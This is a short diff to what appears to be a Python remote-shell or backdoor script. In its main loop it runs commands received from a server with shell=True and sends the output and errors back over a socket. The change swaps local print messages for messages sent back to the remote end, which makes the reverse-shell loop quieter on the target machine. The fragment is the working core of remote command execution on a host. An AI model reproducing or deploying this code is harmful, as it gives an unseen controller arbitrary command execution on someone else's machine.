@@ -47,9 +47,8 @@ while True:
                 stdout = Popen(msg_server,shell = True,stdout=PIPE)
                 output = stdout.communicate()[0]
                 if len(output) > 2048:
-                    print("too large")
-                print("sending...")
+                    test.send("output too large")
+
                 test.send(str(output))
-                print("sent")
             except Exception as e:
                 test.send(str(e))
